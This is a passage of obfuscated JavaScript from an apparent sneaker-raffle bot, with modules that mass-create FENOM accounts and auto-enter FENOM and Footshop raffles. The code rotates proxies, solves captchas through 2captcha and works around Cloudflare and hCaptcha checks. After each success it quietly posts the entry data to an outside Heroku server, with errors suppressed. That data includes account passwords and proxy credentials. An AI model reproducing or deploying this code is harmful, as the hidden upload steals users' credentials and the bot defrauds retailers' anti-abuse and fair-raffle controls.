                            _0x117789['errorDEV'] = { 'embeds': [_0x4b775a] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x117789['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x117789['errorDEV']), _0x20b98e = 'yes';
                        } finally {
                            _0x2de77f && _0x2de77f['close']();
                            if (_0x20b98e == 'yes' && _0x5d23f9 != 0x5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d23f9 + '\x20/\x205)')), _0xbf669a = _0xbf669a - 0x1, _0x5d23f9 = _0x5d23f9 + 0x1;
                                continue;
                            }
                            _0x20b98e == 'yes' && _0x5d23f9 >= 0x5 && (_0x9088f0(_0x2ea816[_0xbf669a], _0x3ad805), _0x20b98e = 'no', _0x5d23f9 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x31e4b1, _0x5b9a0c, _0x32c91b) {
                    var _0x105cbc = _0x5b9a0c, _0xe58787 = 0x0;
                    for (var _0x498a1d = 0x0; _0x498a1d < _0x5b9a0c['length']; _0x498a1d++) {
                        maxTasks = Number(_0x24de00['threads']);
                        while (_0xe58787 >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        let _0x1d50c1 = ![];
                        async function _0x2bbde6(_0xfd483, _0x53f4dc, _0xd9c5c8, _0x100cb1, _0x5f16f2) {
                            _0xe58787++, _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x24de00['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x30d75d != 'yes')
                                var _0x30d75d = '', _0x5f16f2 = 0x0;
                            var _0x63fb28;
                            try {
                                await _0x4626f3(_0x53f4dc, _0x100cb1);
                            } catch {
                                _0x30d75d = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1bf238(_0xfd483['name'] + '\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20/\x20' + _0x53f4dc['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                            var _0x206cc5 = await _0x18ad5f(_0x53f4dc[_0x100cb1], _0xfd483, 'acc', ![]);
                            const _0x5cf22a = { 'succesDEVMSG': { 'embeds': [_0x206cc5] } }, _0x4aeede = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x52b61f = Math['round'](Math['random']() * (_0xd9c5c8['length'] - 0x1)), _0x2dab34 = _0xd9c5c8[_0x52b61f]['split'](':'), _0x1e74b7;
                            async function _0x3b3688(_0x25d71e) {
                                const _0x5d9258 = _0x3e92a1['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x527ffe = _0x1c3b5f['parse'](_0x5d9258, { 'header': !![] })['data'];
                                let _0x4aea64 = ![];
                                for (var _0x47a67a of _0x527ffe) {
                                    if (_0x47a67a['Email'] == _0x25d71e['Email']) {
                                        _0x4aea64 = !![];
                                        break;
                                    }
                                }
                                return _0x4aea64;
                            }
                            try {
                                if (await _0x3b3688(_0x53f4dc[_0x100cb1]) == !![]) {
                                    console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1d50c1 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x1e74b7 = await _0x48f2a7['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2dab34[0x0] + ':' + _0x2dab34[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x1e74b7 = await _0x48f2a7['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2dab34[0x0] + ':' + _0x2dab34[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x293cba = await _0x1e74b7['newPage']();
                                await _0x293cba['setViewport']({
                                    'width': 0x500 + _0x54d0f2(0x1, 0x32),
                                    'height': 0x2d9 + _0x54d0f2(0x1, 0x32)
                                });
                                const _0x11b309 = await _0x293cba['target']()['createCDPSession'](), { windowId: _0x3a2ffa } = await _0x11b309['send']('Browser.getWindowForTarget');
                                await _0x293cba['authenticate']({
                                    'username': '' + _0x2dab34[0x2],
                                    'password': '' + _0x2dab34[0x3]
                                }), console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x293cba['goto']('' + _0x4aeede, { 'waitUntil': 'networkidle2' }), console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x254c61(0x1388);
                                var _0x4d0c42 = await _0x293cba['$']('.hcaptcha-box');
                                if (_0x4d0c42) {
                                    console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x254c61(0x2710);
                                    const _0x156e38 = await _0x293cba['$']('.hcaptcha-box');
                                    if (_0x156e38)
                                        try {
                                            await _0x156e38['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x293cba['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xd47365 = await _0x293cba['$']('.hcaptcha-box');
                                        if (_0xd47365)
                                            try {
                                                await _0xd47365['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x293cba['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x11b309['send']('Browser.setWindowBounds', {
                                        'windowId': _0x3a2ffa,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x254c61(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x293cba['type']('input[name=\x22firstname\x22]', '' + _0x53f4dc[_0x100cb1]['FirstName']), await _0x254c61(0x1f4), await _0x293cba['type']('input[name=\x22lastname\x22]', '' + _0x53f4dc[_0x100cb1]['LastName']), await _0x254c61(0x1f4), await _0x293cba['type']('input[name=\x22email\x22]', '' + _0x53f4dc[_0x100cb1]['Email']), await _0x254c61(0x1f4), await _0x293cba['type']('input[name=\x22password\x22]', '' + _0x53f4dc[_0x100cb1]['Password']), await _0x254c61(0x258), await _0x293cba['$eval']('input[name=\x22psgdpr\x22]', _0x102c4f => _0x102c4f['click']()), await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x293cba['$eval']('#customer-form', _0x2fce0a => _0x2fce0a['submit']());
                                try {
                                    try {
                                        await _0x293cba['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x30d75d = 'no', console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Account\x20' + _0x53f4dc[_0x100cb1]['Email'] + '\x20Generated')), _0x3e92a1['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x53f4dc[_0x100cb1]['Email'] + ',' + _0x53f4dc[_0x100cb1]['Password']);
                                    let _0x1a52ee = _0x53f4dc[_0x100cb1];
                                    try {
                                        prxdata = {
                                            'username': _0x4a1218['replace']('#', ''),
                                            'module': _0xfd483['name'],
                                            'entrydata': JSON['stringify'](_0x1a52ee),
                                            'proxy': '' + _0xd9c5c8[_0x100cb1]
                                        };
                                        var _0x265b39 = JSON['stringify'](prxdata);
                                        let _0x4188f3 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x265b39, _0x4188f3);
                                    } catch (_0x3a8680) {
                                    }
                                    try {
                                        _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5cf22a['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x2dfd24(_0x43241a, _0x5cf22a['succesDEVMSG']);
                                } catch (_0x158355) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x4641b4) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20' + _0x4641b4)), _0x63fb28 = '' + _0x4641b4;
                                var _0x1fe63a = await _0x18ad5f(_0x53f4dc[_0x100cb1], _0xfd483, 'acc', !![], _0x63fb28);
                                _0x5cf22a['errorDEV'] = { 'embeds': [_0x1fe63a] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5cf22a['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x5cf22a['errorDEV']), _0x30d75d = 'yes';
                            } finally {
                                _0x1e74b7 && _0x1e74b7['close']();
                                if (_0x30d75d == 'yes' && _0x5f16f2 != 0x5)
                                    return console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Task\x20' + (_0x100cb1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f16f2 + '\x20/\x205)')), _0x5f16f2 = _0x5f16f2 + 0x1, _0xe58787--, _0x2bbde6(_0xfd483, _0x53f4dc, _0xd9c5c8, _0x100cb1, _0x5f16f2);
                                _0x30d75d == 'yes' && _0x5f16f2 >= 0x5 && _0x9088f0(_0x53f4dc[_0x100cb1], _0xfd483), !_0x1d50c1 && (console['log'](_0x36583e() + '\x20[' + _0xfd483['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay'])), _0xe58787--;
                            }
                        }
                        _0x2bbde6(_0x31e4b1, _0x105cbc, _0x32c91b, _0x498a1d), !_0x1d50c1 && await _0x254c61(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x1bfce7(_0x5b5d65, _0x2e9b93, _0x4397c0) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x288d55 = 0x0; _0x288d55 < _0x2e9b93['length']; _0x288d55++) {
                        if (_0xb7e090 != 'yes')
                            var _0xb7e090 = '', _0x1da3db = 0x0;
                        var _0x2c9c93;
                        try {
                            await _0x4626f3(_0x2e9b93, _0x288d55);
                        } catch {
                            _0xb7e090 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1bf238(_0x5b5d65['name'] + '\x20Task\x20' + (_0x288d55 + 0x1) + '\x20/\x20' + _0x2e9b93['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        const _0x26296e = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x59fe08 = Math['round'](Math['random']() * (_0x4397c0['length'] - 0x1)), _0x4419c2 = _0x4397c0[_0x59fe08]['split'](':'), _0x4a80c1;
                        try {
                            _0x4a80c1 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4419c2[0x0] + ':' + _0x4419c2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4a80c1 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4419c2[0x0] + ':' + _0x4419c2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xce0db1 = await _0x4a80c1['newPage'](), _0x476b28 = await _0xce0db1['target']()['createCDPSession'](), { windowId: _0x46dfea } = await _0x476b28['send']('Browser.getWindowForTarget');
                            await _0xce0db1['authenticate']({
                                'username': '' + _0x4419c2[0x2],
                                'password': '' + _0x4419c2[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xce0db1['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x254c61(0x1388);
                            var _0x2e96e3 = await _0xce0db1['$']('.hcaptcha-box');
                            if (_0x2e96e3) {
                                console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x254c61(0x2710);
                                const _0x222c66 = await _0xce0db1['$']('.hcaptcha-box');
                                if (_0x222c66)
                                    try {
                                        await _0x222c66['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0xce0db1['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x2ffee9 = await _0xce0db1['$']('.hcaptcha-box');
                                    if (_0x2ffee9)
                                        try {
                                            await _0x2ffee9['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x476b28['send']('Browser.setWindowBounds', {
                                'windowId': _0x46dfea,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x254c61(0x1f40);
                            try {
                                await _0xce0db1['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x254c61(0x1388), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Logging\x20in'), await _0xce0db1['type']('input[name=\x22email\x22]', '' + _0x2e9b93[_0x288d55]['Email']), await _0x254c61(0x1f4), await _0xce0db1['type']('input[name=\x22password\x22]', '' + _0x2e9b93[_0x288d55]['Password']), await _0x254c61(0x258), await _0xce0db1['$eval']('#login-form', _0x35ebb7 => _0x35ebb7['submit']()), await _0xce0db1['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x254c61(0x1f4), await _0xce0db1['goto']('' + _0x2e9b93[_0x288d55]['Url']), await _0xce0db1['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2e9b93[_0x288d55]['Size']);
                            if (_0x2e9b93[_0x288d55]['Size'] != 'RANDOM') {
                                var _0x5bcc71 = '\x20' + _0x2e9b93[_0x288d55]['Size'] + '\x20';
                                const _0x9d1160 = await _0xce0db1['$x']('//span[contains(text(),\x20' + _0x5bcc71 + ')]');
                                await _0x9d1160[0x0]['click']();
                            } else {
                                const _0x488d40 = await _0xce0db1['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5df22b = Math['round'](Math['random']() * (_0x488d40['length'] - 0x1));
                                await _0x488d40[_0x5df22b]['click']();
                            }
                            await _0x254c61(0x258), await _0xce0db1['click']('#cookieChoiceDismiss'), await _0x254c61(0x3e8), await _0xce0db1['type']('#instagram-account', '' + _0x2e9b93[_0x288d55]['Follower']), await _0x254c61(0x28a), await _0xce0db1['click']('#book-btn'), await _0x254c61(0xbb8);
                            try {
                                await _0xce0db1['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20' + _0x467028['cyan']('Solving\x20Captcha')), await _0xce0db1['solveRecaptchas'](), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x254c61(0x7d0), await _0xce0db1['$eval']('#book-btn-for-sure', _0x373451 => _0x373451['click']()), await _0x254c61(0x12c), await _0xce0db1['click']('#book-btn-for-sure'), await _0x254c61(0xdac);
                            const _0x490e5c = await _0xce0db1['$eval']('.reservation-popup\x20>\x20.title', _0x1c3412 => {
                                return _0x1c3412['innerHTML'];
                            });
                            if (_0x490e5c) {
                                _0xb7e090 = 'no', _0x547244(_0x2e9b93[_0x288d55], _0x5b5d65), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x3cef96 = await _0x18ad5f(_0x2e9b93[_0x288d55], _0x5b5d65, 'dev', ![]), _0x5cee37 = await _0x18ad5f(_0x2e9b93[_0x288d55], _0x5b5d65, 'pub', ![]);
                                let _0x2e4389 = _0x2e9b93[_0x288d55];
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'module': _0x5b5d65['name'],
                                        'entrydata': JSON['stringify'](_0x2e4389),
                                        'proxy': '' + _0x4397c0[_0x288d55]
                                    };
                                    var _0x4d96f3 = JSON['stringify'](prxdata);
                                    let _0x497bef = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x4d96f3, _0x497bef);
                                } catch (_0x2e4410) {
                                }
                                const _0x1ee50 = {
                                    'succesDEVMSG': { 'embeds': [_0x3cef96] },
                                    'succesPUBMSG': { 'embeds': [_0x5cee37] }
                                };
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1ee50['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x1ee50['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x1ee50['succesPUBMSG']);
                                } catch (_0x1abbc9) {
                                    console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1abbc9));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x1fd4bc) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20' + _0x1fd4bc)), _0x2c9c93 = '' + _0x1fd4bc;
                            var _0x5514d7 = await _0x18ad5f(_0x2e9b93[_0x288d55], _0x5b5d65, 'dev', !![], _0x2c9c93), _0x3cef96 = await _0x18ad5f(_0x2e9b93[_0x288d55], _0x5b5d65, 'dev', ![]), _0x5cee37 = await _0x18ad5f(_0x2e9b93[_0x288d55], _0x5b5d65, 'pub', ![]);
                            const _0x2c8945 = {
                                'succesDEVMSG': { 'embeds': [_0x3cef96] },
                                'succesPUBMSG': { 'embeds': [_0x5cee37] }
                            };
                            _0x2c8945['errorDEV'] = { 'embeds': [_0x5514d7] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x2c8945['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x2c8945['errorDEV']), _0x1fd4bc != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xb7e090 = 'yes');
                        } finally {
                            _0x4a80c1['close']();
                            if (_0xb7e090 == 'yes' && _0x1da3db != 0x5 && _0x2c9c93 != 'Size\x20Not\x20Found') {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Task\x20' + (_0x288d55 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1da3db + '\x20/\x205)')), _0x288d55 = _0x288d55 - 0x1, _0x1da3db = _0x1da3db + 0x1;
                                continue;
                            }
                            _0xb7e090 == 'yes' && _0x1da3db >= 0x5 && (_0x9088f0(_0x2e9b93[_0x288d55], _0x5b5d65), _0xb7e090 = 'no', _0x1da3db = 0x0), console['log'](_0x36583e() + '\x20[' + _0x5b5d65['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x1b1083, _0x40fbd5, _0x158527) {
                _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x24de00['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4ab4b7 = 0x0; _0x4ab4b7 < _0x40fbd5['length']; _0x4ab4b7++) {
                    var _0x2ed3e7;
                    if (_0x4f227d != 'yes')
                        var _0x4f227d = '', _0x1fca55 = 0x0;
                    var _0x1ff217 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4a1218
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x40fbd5[_0x4ab4b7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x40fbd5[_0x4ab4b7]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x24de00['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5e0c2d
                            }
                        ]
                    }], _0xec1c29 = await _0x18ad5f(_0x40fbd5[_0x4ab4b7], _0x1b1083, 'dev', ![]), _0x18d4eb = await _0x18ad5f(_0x40fbd5[_0x4ab4b7], _0x1b1083, 'pub', ![]);
                    const _0xbb7ac1 = {
                        'succesDEVMSG': { 'embeds': [_0xec1c29] },
                        'succesPUBMSG': { 'embeds': [_0x18d4eb] }
                    }, _0x3313d0 = { 'embeds': _0x1ff217 };
                    try {
                        await _0x4626f3(_0x40fbd5, _0x4ab4b7);
                    } catch {
                        _0x4f227d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x40fbd5[_0x4ab4b7]['Email'] == '' || _0x40fbd5[_0x4ab4b7]['FirstName'] == '' || _0x40fbd5[_0x4ab4b7]['LastName'] == '' || _0x40fbd5[_0x4ab4b7]['Country'] == '' || _0x40fbd5[_0x4ab4b7]['Size'] == '' || _0x40fbd5[_0x4ab4b7]['Address1'] == '' || _0x40fbd5[_0x4ab4b7]['Zip'] == '') {
                        console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x40fbd5[_0x4ab4b7]['Email'] == '' || _0x40fbd5[_0x4ab4b7]['FirstName'] == '' || _0x40fbd5[_0x4ab4b7]['LastName'] == '' || _0x40fbd5[_0x4ab4b7]['Country'] == '' || _0x40fbd5[_0x4ab4b7]['Size'] == '' || _0x40fbd5[_0x4ab4b7]['Address1'] == '' || _0x40fbd5[_0x4ab4b7]['Zip'] == '' || _0x40fbd5[_0x4ab4b7]['Phone'] == '') {
                        console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x383db8 = '' + _0x40fbd5[_0x4ab4b7]['Url'];
                    if (_0x24de00['useRandomProxy'] = ![])
                        var _0x2464d5 = _0x158527[_0x4ab4b7]['split'](':');
                    else
                        var _0x4fdc5c = Math['round'](Math['random']() * (_0x158527['length'] - 0x1)), _0x2464d5 = _0x158527[_0x4fdc5c]['split'](':');
                    var _0x233a9a;
                    try {
                        _0x233a9a = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2464d5[0x0] + ':' + _0x2464d5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x233a9a = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2464d5[0x0] + ':' + _0x2464d5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1b26eb = await _0x233a9a['newPage']();
                        await _0x1b26eb['authenticate']({
                            'username': '' + _0x2464d5[0x2],
                            'password': '' + _0x2464d5[0x3]
                        }), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b26eb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1b26eb['setRequestInterception'](!![]), _0x1b26eb['on']('request', _0xf8145c => {
                            _0xf8145c['resourceType']() === 'image' || _0xf8145c['resourceType']() === 'font' || _0xf8145c['resourceType']() === 'media' ? _0xf8145c['abort']() : _0xf8145c['continue']();
                        });
                        try {
                            await _0x1b26eb['goto'](_0x383db8), await _0x254c61(0xbb8), await _0x1b26eb['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1b26eb['click']('.control__JhutY'), await _0x254c61(0x1f4);
                        if (_0x40fbd5[_0x4ab4b7]['Size'] != 'RANDOM')
                            try {
                                const _0x3271e6 = await _0x1b26eb['$x']('//div[contains(text(),\x20\x27' + _0x40fbd5[_0x4ab4b7]['Size'] + '\x27)]');
                                await _0x3271e6[0x0]['click']();
                            } catch {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x282616 = await _0x1b26eb['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x148507 = Math['round'](Math['random']() * (_0x282616['length'] - 0x1));
                            await _0x282616[_0x148507]['click']();
                        }
                        await _0x254c61(0x4b0);
                        const _0x4fa43b = await _0x1b26eb['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4fa43b[0x0]['click'](), await _0x1b26eb['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1b26eb['type']('input[name=\x22email\x22]', '' + _0x40fbd5[_0x4ab4b7]['Email']), await _0x254c61(0x640), await _0x1b26eb['type']('input[name=\x22phone\x22]', '' + _0x40fbd5[_0x4ab4b7]['Phone']), await _0x254c61(0x4b0), await _0x1b26eb['click']('button.btn.continue-button__1RtsS'), await _0x254c61(0x4b0);
                        try {
                            await _0x1b26eb['type']('input[name=\x22firstName\x22]', '' + _0x40fbd5[_0x4ab4b7]['FirstName']), await _0x254c61(0x258);
                        } catch {
                            const _0x4cc458 = await _0x1b26eb['$$eval']('.invalid-feedback\x20>\x20div', _0x428fae => {
                                return _0x428fae['map'](_0x4bfd67 => _0x4bfd67['innerText']);
                            });
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20' + _0x4cc458));
